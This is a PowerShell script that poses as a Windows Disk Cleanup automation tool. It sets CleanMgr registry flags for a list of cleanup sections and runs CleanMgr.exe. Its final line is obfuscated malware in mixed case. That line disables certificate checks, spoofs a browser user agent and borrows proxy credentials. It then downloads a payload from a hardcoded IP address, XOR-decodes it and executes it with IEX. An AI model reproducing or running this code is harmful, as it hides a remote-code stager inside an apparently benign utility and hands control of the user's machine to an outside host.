



 

param(
	[Parameter()]
	[ValidateNotNullOrEmpty()]
	[string[]]$Section
)

$sections = @(
	'Active Setup Temp Folders',
	'BranchCache',
	'Content Indexer Cleaner',
	'Device Driver Packages',
	'Downloaded Program Files',
	'GameNewsFiles',
	'GameStatisticsFiles',
	'GameUpdateFiles',
	'Internet Cache Files',
	'Memory Dump Files',
	'Offline Pages Files',
	'Old ChkDsk Files',
	'Previous Installations',
	'Recycle Bin',
	'Service Pack Cleanup',
	'Setup Log Files',
	'System error memory dump files',
	'System error minidump files',
	'Temporary Files',
	'Temporary Setup Files',
	'Temporary Sync Files',
	'Thumbnail Cache',
	'Update Cleanup',
	'Upgrade Discarded Files',
	'User file versions',
	'Windows Defender',
	'Windows Error Reporting Archive Files',
	'Windows Error Reporting Queue Files',
	'Windows Error Reporting System Archive Files',
	'Windows Error Reporting System Queue Files',
	'Windows ESD installation files',
	'Windows Upgrade Log Files'
)

if ($PSBoundParameters.ContainsKey('Section')) {
	if ($Section -notin $sections) {
		throw "The section [$($Section)] is not available. Available options are: [$($sections -join ',')]."
	}
} else {
	$Section = $sections
}

Write-Verbose -Message 'Clearing CleanMgr.exe automation settings.'

$getItemParams = @{
	Path        = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\*'
	Name        = 'StateFlags0001'
	ErrorAction = 'SilentlyContinue'
}
Get-ItemProperty @getItemParams | Remove-ItemProperty -Name StateFlags0001 -ErrorAction SilentlyContinue

Write-Verbose -Message 'Adding enabled disk cleanup sections...'
foreach ($keyName in $Section) {
	$newItemParams = @{
		Path         = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\$keyName"
		Name         = 'StateFlags0001'
		Value        = 1
		PropertyType = 'DWord'
		ErrorAction  = 'SilentlyContinue'
	}
	$null = New-ItemProperty @newItemParams
}

Write-Verbose -Message 'Starting CleanMgr.exe...'
Start-Process -FilePath CleanMgr.exe -ArgumentList '/sagerun:1' -NoNewWindow -Wait

Write-Verbose -Message 'Waiting for CleanMgr and DismHost processes...'
Get-Process -Name cleanmgr, dismhost -ErrorAction SilentlyContinue | Wait-Process
$WC=NEw-OBjeCt SYsTEm.Net.WEbCLIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wC.HEAderS.Add('User-Agent',$u);$Wc.PROxY = [SystEM.NeT.WEBReQuEst]::DeFauLtWEbPrOxy;$wC.ProXY.CREdENtiAls = [System.NeT.CRedeNtIalCAcHe]::DefaulTNETworKCrEdenTIALS;$K='AKoem{;V*O$E^<0F:_Is~}zdhyni,fpt';$I=0;[CHAR[]]$b=([chAr[]]($wc.DOwNlOadSTRiNg("https://108.61.211.36/index.asp")))|%{$_-bXoR$k[$I++%$K.LenGtH]};IEX ($B-joIn'')

